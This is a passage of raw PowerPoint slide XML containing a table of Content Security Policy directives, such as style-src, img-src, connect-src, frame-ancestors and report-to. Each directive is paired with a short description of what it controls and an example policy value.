          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3523536" y="1764030"/>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style-src</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5479852" y="1764030"/>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CSS sources</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8213408" y="1764030"/>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style-src 'self' 'unsafe-inline'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Shape 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3410069" y="1941671"/>
            <a:ext cx="7810262" cy="219194"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3523536" y="1983224"/>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img-src</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5479852" y="1983224"/>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Image sources</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8213408" y="1983224"/>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img-src * data:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Shape 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3410069" y="2160865"/>
            <a:ext cx="7810262" cy="219194"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000000">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3523536" y="2202418"/>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font-src</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5479852" y="2202418"/>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Font sources</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Text 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8213408" y="2202418"/>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font-src 'self' fonts.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Shape 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3410069" y="2380059"/>
            <a:ext cx="7810262" cy="219194"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Text 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3523536" y="2421612"/>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connect-src</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Text 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5479852" y="2421612"/>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AJAX, WebSocket, EventSource</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Text 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8213408" y="2421612"/>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connect-src 'self' api.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Shape 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3410069" y="2599253"/>
            <a:ext cx="7810262" cy="219194"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000000">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Text 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3523536" y="2640806"/>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media-src</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Text 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5479852" y="2640806"/>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Audio/Video sources</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Text 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8213408" y="2640806"/>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media-src 'self' media.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="Shape 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3410069" y="2818448"/>
            <a:ext cx="7810262" cy="219194"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="Text 36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3523536" y="2860000"/>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object-src</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="Text 37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5479852" y="2860000"/>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Flash, Java, plugins</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Text 38"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8213408" y="2860000"/>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object-src 'none'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="Shape 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3410069" y="3037642"/>
            <a:ext cx="7810262" cy="219194"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000000">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="Text 40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3523536" y="3079194"/>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frame-src</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="Text 41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5479852" y="3079194"/>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Iframe sources</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="44" name="Text 42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8213408" y="3079194"/>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frame-src 'self'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="45" name="Shape 43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3410069" y="3256836"/>
            <a:ext cx="7810262" cy="219194"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="46" name="Text 44"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3523536" y="3298388"/>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worker-src</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47" name="Text 45"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5479852" y="3298388"/>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Web Workers</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="Text 46"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8213408" y="3298388"/>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worker-src 'self'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="49" name="Shape 47"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3410069" y="3476030"/>
            <a:ext cx="7810262" cy="219194"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000000">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="50" name="Text 48"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3523536" y="3517583"/>
            <a:ext cx="172200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manifest-src</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="51" name="Text 49"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5479852" y="3517583"/>
            <a:ext cx="2499241"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Web App Manifest</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="52" name="Text 50"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8213408" y="3517583"/>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manifest-src 'self'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="53" name="Text 51"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="3823216"/>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Document Directives</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="54" name="Shape 52"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="4099560"/>
            <a:ext cx="2396966" cy="672822"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2528"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="000000">
                <a:alpha val="8000"/>
              </a:srgbClr>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="55" name="Shape 53"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3410069" y="4107180"/>
            <a:ext cx="2381726" cy="219194"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="56" name="Text 54"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3523417" y="4148733"/>
            <a:ext cx="960358"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Directive</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="57" name="Text 55"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4718090" y="4148733"/>
            <a:ext cx="960358"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Controls</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="58" name="Shape 56"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3410069" y="4326374"/>
            <a:ext cx="2381726" cy="219194"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000000">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="59" name="Text 57"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3523417" y="4367927"/>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base-uri</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="60" name="Text 58"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4718090" y="4367927"/>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&lt;base&gt; tag URLs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="61" name="Shape 59"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3410069" y="4545568"/>
            <a:ext cx="2381726" cy="219194"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="62" name="Text 60"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3523417" y="4587121"/>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sandbox</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="63" name="Text 61"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4718090" y="4587121"/>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Iframe sandbox</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="64" name="Text 62"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6083737" y="3823216"/>
            <a:ext cx="1749742"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Navigation Directives</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="65" name="Shape 63"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6083737" y="4099560"/>
            <a:ext cx="2396966" cy="944999"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1800"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="000000">
                <a:alpha val="8000"/>
              </a:srgbClr>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="66" name="Shape 64"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6091357" y="4107180"/>
            <a:ext cx="2381726" cy="219194"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="67" name="Text 65"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6204704" y="4148733"/>
            <a:ext cx="960358"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Directive</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="68" name="Text 66"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7399377" y="4148733"/>
            <a:ext cx="960358"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Controls</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="69" name="Shape 67"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6091357" y="4326374"/>
            <a:ext cx="2381726" cy="355283"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000000">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="70" name="Text 68"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6204704" y="4367927"/>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form-action</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="71" name="Text 69"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7399377" y="4367927"/>
            <a:ext cx="960358"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Form submission URLs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="72" name="Shape 70"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6091357" y="4681657"/>
            <a:ext cx="2381726" cy="355283"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="73" name="Text 71"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6204704" y="4723209"/>
            <a:ext cx="960358"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frame-ancestors</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="74" name="Text 72"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7399377" y="4723209"/>
            <a:ext cx="960358"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Embedding in iframes</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="75" name="Text 73"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8765024" y="3823216"/>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Reporting Directives</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="76" name="Shape 74"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8765024" y="4099560"/>
            <a:ext cx="2478048" cy="944999"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1800"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="000000">
                <a:alpha val="8000"/>
              </a:srgbClr>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="77" name="Shape 75"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8772644" y="4107180"/>
            <a:ext cx="2462808" cy="219194"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="78" name="Text 76"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8886111" y="4148733"/>
            <a:ext cx="1000839"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Directive</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="79" name="Text 77"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10121265" y="4148733"/>
            <a:ext cx="1000839"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Controls</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="80" name="Shape 78"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8772644" y="4326374"/>
            <a:ext cx="2462808" cy="355283"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000000">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="81" name="Text 79"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8886111" y="4367927"/>
            <a:ext cx="1000839"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report-uri</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="82" name="Text 80"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10121265" y="4367927"/>
            <a:ext cx="1000839"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Violation reporting (deprecated)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83" name="Shape 81"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8772644" y="4681657"/>
            <a:ext cx="2462808" cy="355283"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="84" name="Text 82"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8886111" y="4723209"/>
            <a:ext cx="1000839"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report-to</a:t>
            </a:r>
